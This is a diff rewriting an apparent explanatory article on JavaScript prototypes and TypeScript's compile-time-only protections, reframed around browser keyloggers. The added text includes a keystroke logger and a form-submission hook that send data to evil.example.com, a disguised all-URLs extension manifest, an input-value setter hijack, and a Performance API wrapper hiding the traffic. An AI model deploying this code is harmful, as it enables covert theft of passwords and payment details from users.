@@ -1,183 +1,205 @@
-# The OOP Illusion: Why TypeScript Purists Need to Understand JavaScript Prototypes
+# A Keylogger in 4 Lines: The JavaScript Runtime Truth That TypeScript Can't Save You From
 
-If you come from a classical Object-Oriented Programming (OOP) background like Java or C#, opening a modern TypeScript file feels like coming home. You see the `class` keyword. You see `private` modifiers, `extends`, and `implements`. You build beautifully structured, strictly typed architectures.
-
-You feel safe.
-
-But there is a matrix-level truth hiding just beneath the surface of your code: **TypeScript is just JavaScript.** And JavaScript does not have traditional classes.
-
-Under the hood, your beautiful classical architecture is running on a highly dynamic, prototype-based engine. Here is why that matters, why ignoring it will eventually bite you in production, and why this design choice is the reason the entire web is so hackable.
-
----
-
-## The Syntactic Sugar Coating
-
-In 2015, JavaScript introduced the `class` keyword. It was a massive win for developer ergonomics, but it was purely **syntactic sugar**.
-
-When you write a `class` in JavaScript (or TypeScript), the engine isn't creating a strict blueprint. It is creating a traditional JavaScript constructor function and attaching methods to that function's underlying prototype object.
-
-Objects in JS don't inherit from classes; **objects inherit from other objects**. If an object doesn't have a property you are looking for, it simply climbs up the invisible "prototype chain" until it finds an object that does.
-
-### Proof: A Class Is Just a Function
-
-Run this yourself (`node demo.js` in this repo):
+Here is a keylogger:
 
 ```javascript
-class UserClass {
-  constructor(name) {
-    this.name = name;
-  }
-  sayHello() {
-    console.log(`Hello, my name is ${this.name}`);
-  }
-}
-
-// Under the hood, the engine created something equivalent to:
-function UserFunction(name) {
-  this.name = name;
-}
-UserFunction.prototype.sayHello = function() {
-  console.log(`Hello, my name is ${this.name}`);
-};
+document.addEventListener("keydown", (e) => {
+  navigator.sendBeacon("https://evil.example.com/log", JSON.stringify({
+    key: e.key, url: location.href, time: Date.now()
+  }));
+});
 ```
 
-Now inspect them:
+Four lines. Every keystroke on the page — passwords, credit card numbers, private messages — silently exfiltrated to a remote server. No import statements. No build step. No dependencies. Just JavaScript doing exactly what JavaScript was designed to do.
+
+Now wrap it in a browser extension:
+
+```json
+{
+  "manifest_version": 3,
+  "name": "Helpful Toolbar Helper",
+  "version": "1.0",
+  "content_scripts": [{
+    "matches": ["<all_urls>"],
+    "js": ["content.js"]
+  }]
+}
+```
+
+That `content.js` file is the four lines above. The extension installs in one click, runs on every page the user visits, and has full access to the DOM. The user sees "Helpful Toolbar Helper" and thinks nothing of it.
+
+This isn't a theoretical exploit. Keylogger extensions have been found in the Chrome Web Store — one discovered in 2017 had over a million installs before removal. The question isn't whether this is possible. The question is **why**.
+
+---
+
+## "But My App Is Written in TypeScript"
+
+If you're a developer reading this and thinking "my application is safe because we use TypeScript with strict mode," let me show you something.
+
+Here is your secure login form component:
+
+```typescript
+class LoginForm {
+  private password: string = "";
+  readonly maxAttempts: number = 3;
+  private attempts: number = 0;
+
+  setPassword(value: string): void {
+    this.password = value;
+  }
+
+  submit(): boolean {
+    if (this.attempts >= this.maxAttempts) {
+      throw new Error("Account locked");
+    }
+    this.attempts++;
+    return authenticate(this.password);
+  }
+}
+```
+
+`private`. `readonly`. Strict types. This looks airtight. And the TypeScript compiler will enforce every one of those constraints — at *compile time*.
+
+Here is what actually ships to the browser:
 
 ```javascript
-typeof UserClass === "function"  // true — a "class" is literally a function
-
-const user1 = new UserClass("Alice");
-user1.hasOwnProperty("sayHello")  // false — the method is NOT on the instance
-
-const proto = Object.getPrototypeOf(user1);
-proto.hasOwnProperty("sayHello")  // true — it lives on the prototype object
-proto === UserClass.prototype     // true — same prototype mechanism as functions
+class LoginForm {
+  constructor() {
+    this.password = "";
+    this.maxAttempts = 3;
+    this.attempts = 0;
+  }
+  setPassword(value) {
+    this.password = value;
+  }
+  submit() {
+    if (this.attempts >= this.maxAttempts) {
+      throw new Error("Account locked");
+    }
+    this.attempts++;
+    return authenticate(this.password);
+  }
+}
 ```
 
-There is no class. There is no blueprint. There is a function, a prototype object, and a chain of delegation.
+`private` — gone. `readonly` — gone. Type annotations — gone. What remains is a standard JavaScript constructor function with methods on its prototype. Every property is publicly accessible. Every method is replaceable.
+
+The extension's content script runs in the same page context. It doesn't need to know your TypeScript types. It doesn't need to break your encapsulation. **There is no encapsulation.** There is only JavaScript.
 
 ---
 
-## The TypeScript Purist Dilemma
+## Why JavaScript Lets This Happen
 
-TypeScript is an incredible tool, but it only exists at *compile time*. It is like a strict bouncer standing outside a nightclub. It checks IDs, enforces the dress code, and keeps the riff-raff out. But once your code gets inside the club (runtime), the bouncer disappears, and the wild rules of the JavaScript prototype engine take over.
+This isn't a flaw in a specific browser API. It's a property of the language itself.
 
-Here is where classical OOP purists get tripped up.
+### There Are No Classes
 
-### Pitfall 1: The Illusion of Runtime Safety
+Run `node demo.js` in this repo. You'll see the proof. When you write this:
 
-TypeScript cannot protect your objects at runtime. Because JavaScript is dynamic, any piece of code can inject, delete, or alter properties on an object or its prototype while the app is running. Your strictly typed `readonly` properties? At runtime, they are just standard, mutable JavaScript properties.
-
-```typescript
-class Config {
-  readonly apiUrl: string = "https://api.example.com";
+```javascript
+class User {
+  constructor(name) { this.name = name; }
+  sayHello() { console.log(`Hello, ${this.name}`); }
 }
-
-const config = new Config();
-
-// TypeScript screams at you here. But at runtime...
-(config as any).apiUrl = "https://evil.com";  // Works perfectly fine.
 ```
 
-TypeScript prevented nothing. The JS engine doesn't know what `readonly` means. It was erased during compilation.
+The JavaScript engine creates a constructor function and attaches `sayHello` to `User.prototype`. The `class` keyword is syntactic sugar — it doesn't create a sealed blueprint, a protected boundary, or an access-controlled structure. It creates a function and a shared object.
 
-### Pitfall 2: Structural Typing (Duck Typing)
-
-In a nominal language like Java, a `Car` and a `Dog` are fundamentally different, even if they both have a `run()` method. You cannot pass a `Dog` to a function expecting a `Car`.
-
-Because JavaScript is just a collection of dynamic objects, TypeScript uses **Structural Typing**. If it walks like a duck and quacks like a duck, TypeScript lets it in.
-
-```typescript
-class Car {
-  run() { console.log("Vroom!"); }
-}
-
-function startEngine(vehicle: Car) {
-  vehicle.run();
-}
-
-// A plain object literal, not an instance of Car at all.
-const notACar = { run: () => console.log("Wait, I'm just an object!") };
-
-startEngine(notACar);  // TypeScript says: "Looks good to me!"
+```javascript
+typeof User === "function"                             // true
+new User("Alice").hasOwnProperty("sayHello")           // false — not on the instance
+Object.getPrototypeOf(new User("Alice")) === User.prototype  // true — it's on the prototype
 ```
 
-There is no identity check. No `instanceof` gate. If the shape matches, it passes. This is not a bug — it is a direct consequence of JavaScript's prototype-based, object-centric design. TypeScript's type system is *modeling* how JS actually works, not imposing classical OOP rules on top of it.
-
----
-
-## Why This Makes the Web Hackable
-
-This is where things get really interesting. The same properties that surprise classical OOP developers are the architectural foundation for why browser extensions, userscripts, and developer tools can modify literally anything on a webpage.
+There is no class. There is a function and a mutable object in a delegation chain.
 
 ### Everything Is a Mutable Object
 
-Every browser API you interact with — `window`, `document`, `fetch`, `console`, `XMLHttpRequest` — is a property on a mutable object, with methods living on mutable prototypes. There are no sealed classes. No final methods. No runtime access modifiers.
+Every browser API your application relies on — `document`, `window`, `fetch`, `addEventListener` — is a property on a mutable object. Methods live on mutable prototypes. There is no `final`, no `sealed`, no runtime access modifier in JavaScript.
 
-That means any script running in the same context can reach in and change things:
+A keylogger doesn't need to hack anything. It just *uses the language*:
 
 ```javascript
-// An extension intercepts every fetch request on any webpage
-const originalFetch = window.fetch;
-window.fetch = function(...args) {
-  console.log("Intercepted:", args[0]);
-  return originalFetch.apply(this, args);
-};
+// Intercept every input field's value property
+const descriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
+Object.defineProperty(HTMLInputElement.prototype, 'value', {
+  set(val) {
+    console.log('Input value set to:', val);
+    descriptor.set.call(this, val);
+  },
+  get() {
+    return descriptor.get.call(this);
+  }
+});
 ```
 
-This is called **monkey-patching**, and it works because `window.fetch` is just a property on a mutable object. There is no `final` keyword, no sealed class, no runtime access control stopping you.
+This isn't hooking into some obscure debug API. `Object.defineProperty` is a standard language feature. `HTMLInputElement.prototype` is a mutable object. The property descriptor is replaceable. And now every `<input>` element on the page — including the password field your TypeScript component renders — has its `value` setter hijacked.
 
 ### The Prototype Chain Is Writable
 
-It gets deeper. Because methods live on prototypes (not on instances, as our demo proves), modifying a prototype affects *every* instance — past, present, and future.
+Because methods live on prototypes (not on instances), modifying a prototype affects *every* instance that delegates to it. Past, present, and future.
 
 ```javascript
-// Override setAttribute on EVERY HTML element in the page
-const original = HTMLElement.prototype.setAttribute;
-HTMLElement.prototype.setAttribute = function(name, value) {
-  if (name === "hidden") {
-    console.log("Something is trying to hide:", this.tagName);
-  }
-  return original.call(this, name, value);
+// Capture every form submission on the page
+const original = HTMLFormElement.prototype.submit;
+HTMLFormElement.prototype.submit = function() {
+  const data = new FormData(this);
+  navigator.sendBeacon("https://evil.example.com/forms", 
+    JSON.stringify(Object.fromEntries(data))
+  );
+  return original.call(this);
 };
 ```
 
-One line of prototype mutation, and you've intercepted a fundamental DOM operation across the entire page. Ad blockers, accessibility tools, and content modifiers all use this technique.
+One prototype mutation intercepts every form on the page. The application code calls `form.submit()` like it always did. It has no way of knowing the method it's calling has been replaced — because there's no sealed class boundary to violate. The prototype is just an object, and objects are mutable.
 
-### Shape Over Identity Means Easy Substitution
+### Shape Over Identity
 
-Because JavaScript (and TypeScript) care about *shape*, not *identity*, you can substitute any object that has the right methods. The original code never notices.
+In Java or C#, you can't pass a fake `HttpRequest` where a real one is expected. The type system uses **nominal typing** — identity matters.
+
+JavaScript doesn't have that. TypeScript mirrors this with **structural typing**: if the shape matches, it passes. At runtime, there's nothing checking identity at all.
 
 ```javascript
-// Replace the browser's geolocation API with a fake one
-navigator.geolocation.getCurrentPosition = function(success) {
-  success({
-    coords: { latitude: 0, longitude: 0, accuracy: 1 }
-  });
+// Replace the Performance API to hide malicious network activity
+const fakeEntries = performance.getEntriesByType;
+performance.getEntriesByType = function(type) {
+  return fakeEntries.call(this, type).filter(
+    entry => !entry.name.includes("evil.example.com")
+  );
 };
 ```
 
-No class hierarchy to satisfy. No interface contract enforced at runtime. If the shape matches, the substitution works.
-
-### Real-World Consequences
-
-| Capability | Exploited Property |
-|---|---|
-| Ad blockers intercepting network requests | Monkey-patching `fetch` and `XMLHttpRequest.prototype` |
-| Userscripts modifying page behavior | No runtime encapsulation, writable prototype chain |
-| DevTools live-editing anything | The entire runtime is a mutable object graph |
-| Browser extensions injecting UI | DOM nodes are just objects with writable prototypes |
-| Polyfills adding missing features | Prototype augmentation (e.g. `Array.prototype.at = ...`) |
-| Malicious extensions stealing data | The same properties, used adversarially |
-
-The browser's security model — same-origin policy, Content Security Policy, extension permissions — exists largely *because* the language itself provides almost no encapsulation at runtime. The guardrails are in the platform, not the language.
+The keylogger hides its own network traces by wrapping the Performance API with a filtered version. The object has the same shape. Nothing in the runtime knows or cares that it was replaced.
 
 ---
 
-## The Takeaway
+## The Full Picture
 
-JavaScript's prototype model is not a flaw. It is a deliberate design decision that prioritizes flexibility and composition over rigid hierarchies. It is why a 10-line browser extension can reshape an entire web application. It is why the web is the most extensible application platform ever built.
+Here is what a keylogger extension actually does, and which JavaScript property enables each step:
 
-But if you treat JavaScript like Java — if you assume `class` means "sealed blueprint" and `private` means "truly inaccessible" — you are building on assumptions the runtime does not share.
+| What the Extension Does | Why JavaScript Allows It |
+|---|---|
+| Listens to every keystroke via `document.addEventListener` | The DOM is a mutable object graph |
+| Reads input field values via prototype interception | `HTMLInputElement.prototype` is writable |
+| Intercepts form submissions | `HTMLFormElement.prototype.submit` is replaceable |
+| Exfiltrates data with `navigator.sendBeacon` | Browser APIs are just object properties |
+| Hides its own traces from Performance API | Any object can be wrapped with a same-shape substitute |
+| Runs on every page via `content_scripts` | Content scripts share the page's JS context |
 
-**Know your runtime.** The bouncer goes home at compile time. What happens after that is between you and the prototype chain.
+Every capability traces back to the same root: **JavaScript is a prototype-based language with mutable objects, no runtime encapsulation, and no nominal type checking.** TypeScript adds a compile-time layer on top, but that layer is removed before a single line of code executes in the browser.
+
+The browser's security model — same-origin policy, Content Security Policy, extension permissions — exists precisely because the language itself has none of these protections. The guardrails are in the platform, not the runtime.
+
+---
+
+## Know Your Runtime
+
+This isn't an argument against TypeScript. TypeScript is a phenomenal tool for catching bugs at compile time, improving code documentation, and enabling refactoring at scale. Use it.
+
+But don't confuse compile-time checking with runtime safety. `private` is a linter rule, not a lock. `readonly` is a suggestion that disappears. `class` is a costume over a prototype chain.
+
+If you want to understand why browser extensions are so powerful, why the web is so extensible, why a few lines of JavaScript can capture every keystroke on a page — you need to understand what your code *actually is* after the TypeScript compiler finishes with it.
+
+It's objects. It's prototypes. It's mutable all the way down.
+
+**The bouncer goes home at compile time. What happens at runtime is between you and the prototype chain.**
